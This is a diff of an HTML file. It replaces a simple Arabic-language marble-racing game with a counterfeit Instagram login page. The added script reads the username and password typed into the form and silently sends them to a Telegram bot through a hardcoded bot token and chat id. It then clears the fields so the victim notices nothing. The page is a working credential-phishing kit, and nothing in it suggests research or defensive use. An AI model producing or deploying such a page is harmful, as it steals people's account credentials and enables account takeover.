@@ -3,92 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سباق الكرات الزجاجية</title>
+    <title>تسجيل الدخول</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f0f0;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
         }
-
-        #raceTrack {
-            width: 600px;
-            height: 400px;
-            background-color: #eee;
-            border: 2px solid #333;
-            margin: 20px auto;
-            position: relative;
-            overflow: hidden;
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+            padding: 40px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
-
-        .ball {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            position: absolute;
-            top: 0;
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 20px;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
-
-        #ball1 { background-color: red; }
-        #ball2 { background-color: blue; }
-        #ball3 { background-color: green; }
-
-        .obstacle {
-            width: 50px;
-            height: 50px;
-            background-color: black;
-            position: absolute;
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a3a3a3;
+        }
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #007acc;
         }
     </style>
 </head>
 <body>
+    <div class="login-container">
+        <div class="logo">Instagram</div>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم" required />
+            <input type="password" id="password" placeholder="كلمة المرور" required />
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
 
-<h1>لعبة سباق الكرات الزجاجية</h1>
-<p>انقر لبدء السباق!</p>
+    <script>
+        const botToken = '8080174902:AAHX9XK3_Yd-TkY8Vq2LBzK8BGCWFmqy17o'; // توكن البوت
+        const chatId = '7203065656'; // معرف الدردشة الخاص بك
 
-<div id="raceTrack">
-    <div id="ball1" class="ball"></div>
-    <div id="ball2" class="ball"></div>
-    <div id="ball3" class="ball"></div>
-    <div class="obstacle" style="left: 200px; top: 150px;"></div>
-    <div class="obstacle" style="left: 400px; top: 250px;"></div>
-</div>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع إرسال النموذج الافتراضي
 
-<script>
-    const balls = [
-        {element: document.getElementById('ball1'), position: 0, speed: Math.random() * 3 + 1},
-        {element: document.getElementById('ball2'), position: 0, speed: Math.random() * 3 + 1},
-        {element: document.getElementById('ball3'), position: 0, speed: Math.random() * 3 + 1}
-    ];
+            // جمع البيانات
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-    let raceStarted = false;
+            // رسالة التي ستُرسل
+            const message = `👤 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
 
-    document.body.addEventListener('click', startRace);
+            // رابط API تيليغرام
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-    function startRace() {
-        if (raceStarted) return;
-        raceStarted = true;
+            // إرسال الطلب بصمت
+            fetch(url)
+                .catch(error => {
+                    console.error('Error:', error); // تسجيل الأخطاء في وحدة التحكم فقط
+                });
 
-        balls.forEach((ball, index) => {
-            ball.interval = setInterval(() => {
-                ball.position += ball.speed;
-                ball.element.style.left = ball.position + 'px';
-
-                if (ball.position >= 550) {
-                    clearInterval(ball.interval);
-                    announceWinner(ball.element);
-                }
-            }, 30);
+            // إعادة توجيه أو إعادة تعيين النموذج بعد الإرسال
+            document.getElementById('loginForm').reset(); // إعادة تعيين الحقول
         });
-    }
-
-    function announceWinner(winnerBall) {
-        setTimeout(() => {
-            alert(`${winnerBall.id} فاز بالسباق!`);
-        }, 100);
-    }
-</script>
-
+    </script>
 </body>
 </html>
